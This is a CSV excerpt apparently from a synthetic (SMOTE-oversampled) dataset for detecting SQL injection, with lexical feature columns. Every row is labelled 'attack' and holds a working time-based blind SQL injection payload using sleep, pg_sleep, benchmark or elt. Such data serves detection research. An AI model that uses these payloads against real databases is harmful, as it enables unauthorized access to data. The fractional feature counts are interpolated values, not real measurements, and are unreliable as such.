id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000030,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000028,1.1326984095059576,58.944019698940096,23.75699753763249,3.606137037527763,18.24300246236751,10.0,23.215012311837558,7.486004924735023,0.310083342988941,0.17019157975994575,0.39311397257707387,0.12661110467403933,0.0,1.0,2.0,0.0,0.0,1.0,0.0,3.2430024623675116,0.0,0.2430024623675116,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.24300246236751144,0.0,0.7569975376324884,0.2430024623675115,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7569975376324884,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000031,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,0.6751825391204428,71.96843588203134,26.28270817924108,3.6573290088700574,23.28270817924108,11.130832716964322,29.272186806584862,8.28270817924108,0.3254803283544144,0.15271225421098628,0.40654825844725895,0.11525915898734039,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.14135408962054,0.0,4.14135408962054,0.0,1.0,0.0,3.14135408962054,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.14135408962054022,1.0,0.14135408962054025,0.8586459103794597,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.14135408962054
SMOTE_000032,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,1.335932655277192,71.51538822941357,24.303077645882716,3.5605563257355755,20.628847057353394,12.606155291765432,28.954616468824074,9.325769411470679,0.2890647388903371,0.17271424645622033,0.40654019697364674,0.13168081767979584,0.0,1.0,2.0,0.0,0.0,1.325769411470679,0.0,4.0,0.0,1.0,0.0,3.325769411470679,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.325769411470679,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.325769411470679
SMOTE_000033,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000001,0.09313373174221445,71.27907509285528,24.059801805611848,3.4459610018020994,19.099669676019744,10.159471481631591,31.039867870407896,10.980066064796052,0.267899605672436,0.14225877784047888,0.4356552263331312,0.15418639015395386,0.0,1.0,2.0,0.0,0.0,1.019933935203949,0.0,4.980066064796051,0.9800660647960511,1.0,0.0,3.019933935203949,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.019933935203948816,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.019933935203949
SMOTE_000034,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,2.4550614285210153,64.43000687383653,23.92273039719842,3.5269597919927174,19.676368635517477,10.0,26.753638238319052,8.0,0.3022936726018155,0.15634680941070334,0.4162820704589185,0.12507744752856265,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.5845460794396844,0.4154539205603157,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5845460794396844,0.0,0.0,0.5845460794396844,0.4154539205603156,0.5845460794396844,0.0,0.0,0.0,0.0,0.0,0.0,0.4154539205603156,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5845460794396846
SMOTE_000035,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000006,0.7499300554804289,85.43792868607224,24.847629457120487,3.1841724570983474,30.0,2.0,41.13318760031321,12.30474108575903,0.3525449847167863,0.0235029989811191,0.4798558296299354,0.14409618667215926,0.15237054287951468,0.8476294571204853,0.0,0.0,1.0,0.0,0.0,8.457111628638543,0.8476294571204852,0.0,0.0,1.0000000000000002,0.15237054287951465,0.8476294571204853,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000036,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,0.2635403366156755,68.63485880851273,25.726144106384545,3.6493005495978923,22.634858808512725,10.0,27.908714702128183,8.091285297871819,0.32958829547192536,0.14574167489740752,0.4066723005147131,0.11799772911595399,0.0,0.0912852978718185,2.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.0912852978718186,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000037,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,1.5647539571258258,98.16732387286513,23.167323872865122,2.8593897921034643,29.167323872865122,2.0,53.0,14.0,0.29704731305088966,0.020375440201423498,0.5399491653377224,0.1426280814099644,0.583661936432561,0.41633806356743897,0.0,0.0,1.0,0.0,0.0,11.0,0.0,0.0,0.0,1.0000000000000002,0.5836619364325609,0.416338063567439,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.41633806356743897,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.416338063567439
SMOTE_000038,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000029,1.1989142216550535,72.0,25.334909434423366,3.574107898652945,15.0,20.501182075817525,28.332545282788317,8.166272641394158,0.20833333333333334,0.28473863994191007,0.39350757337206,0.11342045335269664,0.8337273586058412,-1.1102230246251565e-16,0.3325452827883174,0.0,0.0,1.1662726413941589,0.0,4.833727358605842,0.0,0.0,1.0,1.4988179241824764,0.8337273586058412,0.0,0.1662726413941587,0.0,0.0,1.0,1.0,0.0,0.0,0.8337273586058412,0.0,0.0,0.0,0.1662726413941588,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1662726413941587,0.8337273586058412,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.166272641394159
SMOTE_000039,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,1.4545747641352187,61.82876671215213,22.435787517057047,3.4541080545417304,15.957191678038033,12.871575034114098,25.0,8.0,0.2581746543904762,0.2022981558380933,0.40873271952381096,0.1307944702476195,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.23929791950950813,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7607020804904918,0.23929791950950813,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000040,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000022,1.0642002741324132,76.9039326698224,19.602621779881602,2.9815979854137225,27.3013108899408,2.0,38.3013108899408,9.301310889940801,0.35501223276986943,0.0260146793238433,0.49809296905100764,0.12088011885527969,0.0,0.3013108899408003,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.30131088994080046,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.3013108899408003,0.6986891100591996,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000041,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000022,2.297345318175575,84.98508019223182,20.953278302659093,2.930382293119311,28.171966981595457,2.0,43.85983490797727,10.953278302659092,0.33485809747620887,0.023927410900523166,0.5138110587056703,0.12740343291759762,0.39065566053181844,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,9.171966981595457,0.0,0.0,0.0,1.0000000000000002,0.3906556605318184,0.0,0.0,0.39065566053181844,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.6093443394681815,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.609344339468182
SMOTE_000042,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000016,0.7419988365248698,81.05664991666039,21.587614261902967,3.106485381656779,29.762842785708905,1.853096434524259,39.14690356547574,10.293807130951484,0.3655476224859824,0.023176986320143672,0.4843332019767019,0.1269421892171721,0.4407106964272261,0.853096434524258,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0000000000000002,0.146903565475742,0.853096434524258,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000043,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000009,2.3704694706322593,69.93015700653676,26.0,3.816876397229266,25.259107431061626,10.0,24.38866114659244,10.282388428882703,0.3608803794922056,0.14534897609092506,0.34509945151555954,0.1486711929013098,3.2823884288827028,-1.1102230246251565e-16,0.0,0.0,0.0,1.2823884288827032,0.0,3.282388428882703,0.0,0.2823884288827031,0.0,2.717611571117297,1.0,0.0,0.0,0.717611571117297,0.0,1.0,1.0,0.0,0.0,0.0,0.7176115711172969,1.0,0.0,0.717611571117297,0.2823884288827031,1.2823884288827032,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7176115711172969,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000044,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,0.40239876835892746,87.92746942927423,27.225189956098017,3.685232783081793,25.35113973658811,18.0,34.35113973658811,10.225189956098017,0.287705595595127,0.2054388415693954,0.3904250163798247,0.11643054645565297,0.0,1.0,2.0,0.0,0.0,2.0,0.0,4.225189956098018,0.0,1.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000045,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000022,2.3557734235928187,84.3742785243125,20.196325503473215,2.8951954224943353,27.398775167824404,2.0,43.98162751736607,10.993875839122023,0.32870339020594375,0.024043874518634697,0.5184998789196889,0.12875285635573266,0.0,0.3987751678244047,0.0,0.0,1.0,0.0,0.0,9.196325503473215,0.0,0.0,0.0,1.0000000000000002,0.0,0.3987751678244047,0.0,0.39877516782440475,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.3987751678244047,0.6012248321755953,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000046,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,1.0581939290052689,68.66116875555568,22.445177499259245,3.4606135166528094,15.667766248888865,16.219290002963024,28.219290002963024,8.554822500740755,0.23225186125406028,0.23340347042235277,0.40983280154645896,0.12451186677712803,0.0,0.2225887496296221,2.0,0.0,0.0,1.777411250370378,0.0,3.7774112503703776,0.0,0.0,0.777411250370378,3.7774112503703776,0.0,0.2225887496296221,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000047,attack,time,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000021,4.535523276259711,83.2151305909652,19.934657460024685,2.7477822836719707,17.28047313094051,5.588841789108863,45.794420894554435,14.551394776361391,0.19986077161040944,0.061564482765450707,0.5589536882023841,0.17962105742175577,2.205579105445568,1.7944208945544315,0.0,0.0,0.0,1.0,0.0,8.0,1.102789552722784,0.0,0.4486052236386078,1.0000000000000002,0.5513947763613921,0.44860522363860783,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5513947763613922,0.4486052236386079,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000048,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000028,2.6601142996723364,59.109075476514235,24.602592993289782,3.710057440852837,19.506482483224456,10.0,21.698703503355112,7.903889489934674,0.3289216400675816,0.16965713959288858,0.36853794934427847,0.1328832709952513,0.9038894899346733,0.6987035033551087,1.3974070067102176,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,0.3012964966448913,0.6987035033551087,0.6987035033551088,0.3012964966448912,0.0,1.0,1.0,0.0,0.0,0.0,0.3012964966448912,0.30129649664489133,0.0,1.0,0.0,0.3012964966448912,0.6987035033551088,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.301296496644891
SMOTE_000049,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000028,3.0708889820373586,59.60941572472901,24.326176965591127,3.7336497167964464,19.630884827955633,10.652353931182253,21.673823034408873,7.652353931182254,0.3282026861399052,0.17843185339543813,0.3654522987900857,0.12791316167457095,0.6523539311822535,0.6738230344088733,2.0,0.0,0.0,1.0,0.0,2.673823034408873,0.0,0.0,0.0,3.0,0.3261769655911268,0.6738230344088731,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.6738230344088733,0.0,0.0,0.0,0.0,0.0,0.0,0.6738230344088731,0.0,0.32617696559112674,0.32617696559112674,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000050,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000004,1.944002365412246,62.557125328270004,23.0,3.589005064074095,19.905499898993845,12.46262522726385,23.641750151509235,6.547250050503077,0.32314615398939894,0.1953210063855619,0.3772614175416913,0.10427142208334783,0.7263749747484612,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,3.5472500505030773,0.0,0.0,0.27362502525153876,1.0000000000000002,0.7263749747484612,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.27362502525153876,0.0,0.0,0.0,0.7263749747484614,0.0,0.0,0.27362502525153876,0.0,0.0,0.0,0.0,0.0,0.0,0.7263749747484614,0.27362502525153876,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000051,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000001,0.3610473955655108,70.46142904157736,24.0,3.4529706373251394,19.0,10.0,30.569143233261887,10.89228580831547,0.269789340207006,0.14199438958263474,0.4336544748768023,0.15456179533355688,0.10771419168452856,0.8922858083154714,2.0,0.0,0.0,1.0,0.0,4.892285808315472,1.0,1.0,0.0,3.0,0.1077141916845285,0.8922858083154714,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000052,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,2.3905632994074333,75.43860603807127,26.0,3.4705409510636205,21.620298706127585,10.0,33.978705606780466,9.83960172516322,0.29085257060366054,0.13368499032989128,0.44635057059574934,0.1291118684706988,0.4599004312908051,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,5.379701293872415,0.0,1.0,0.0,3.0,0.45990043129080505,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.45990043129080505,0.540099568709195,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000053,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,0.023152698047308802,64.9602636494317,23.004967043821036,3.494154172214307,18.995032956178964,10.0,26.975164780894815,8.990065912357926,0.2924243273447855,0.15395340445497518,0.41523848643009637,0.13838378177014302,0.0,1.0,2.0,0.0,0.0,1.0,0.0,3.9950329561789624,0.0,0.9950329561789626,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9950329561789625,0.0,0.0049670438210373535,0.9950329561789626,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0049670438210374646,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000054,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000010,0.13303090261499784,77.35051227787878,22.11683742595959,3.3053687714933235,15.097364521632993,18.233674851919186,34.0,10.019472904326598,0.19511133069002856,0.23536346446971418,0.4399292662408915,0.12959593859936572,0.01947290432659876,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,4.0,0.01947290432659876,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.019472904326598692,0.0,0.0,0.0,1.0,0.0,0.01947290432659876,0.9805270956734011,0.0,0.0,0.0,0.0,0.0,0.0,0.9805270956734012,0.019472904326598692,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000055,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,0.21505085920221445,85.30350015955342,27.060700031910685,3.6941421809153123,24.060700031910685,18.0,33.24280012764274,10.0,0.2820752286121733,0.2110505878598743,0.3896238569391333,0.11725032658881906,0.0,0.9392999680893156,2.0,0.0,0.0,2.0,0.0,4.0607000319106845,0.0,1.0,0.0,4.0,0.0,0.9392999680893155,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.060700031910684404,0.9392999680893155,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000056,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,1.4481778694248832,61.81192865189427,22.42947324446035,3.453574535847018,15.952982162973566,12.858946488920703,25.0,8.0,0.25817661595388,0.2021667310900415,0.4088307976939989,0.13082585526207965,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.23824554074339174,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7617544592566082,0.23824554074339174,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000057,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,0.24792058417413307,98.86807027972223,23.868070279722236,2.889899086359763,29.86807027972224,2.0,53.0,14.0,0.30208235439975367,0.020229496973920194,0.5360816698088848,0.1416064788174413,0.9340351398611186,0.06596486013888136,0.0,0.0,1.0,0.0,0.0,11.0,0.0,0.0,0.0,1.0000000000000002,0.9340351398611184,0.06596486013888148,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.06596486013888148,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.065964860138881
SMOTE_000058,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000002,2.394028035194236,74.91100365053956,24.651833941756593,3.3551030079893613,19.550611313918864,10.0,34.7085583948641,10.651833941756593,0.26403719481825294,0.13547543345590443,0.4586578678594251,0.14182950386641752,0.5506113139188642,0.44938868608113586,2.0,0.0,0.0,1.0,0.0,5.651833941756592,0.0,1.0,0.0,3.0,0.5506113139188642,0.4493886860811359,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.5506113139188641,0.44938868608113586,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000059,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000015,2.589890217548635,83.65082690872082,22.185950545348803,3.081999932657859,23.85578516360464,6.567355490813925,41.13471098162785,12.092975272674401,0.2947689537997389,0.06992437870331601,0.4906596730294816,0.1446469944674635,0.0,3.6185950545348806,0.0,0.0,0.0,1.0,0.0,6.855785163604642,0.0,0.0,0.6185950545348804,1.0000000000000002,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.3814049454651196,0.0,0.0,0.0,1.0,0.6185950545348804,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000060,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000019,1.751319444380048,85.2886784738213,26.28867847382131,3.7114788941854244,32.15471389528525,10.0,32.42264305235738,10.711321526178688,0.37690857023403357,0.1172521498306138,0.3802186415614601,0.1256206383738925,2.845286104714753,1.1547138952852465,0.0,0.0,0.0,1.7113215261786885,0.0,4.0,0.0,1.0,0.0,1.7113215261786885,0.7113215261786883,0.28867847382131173,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
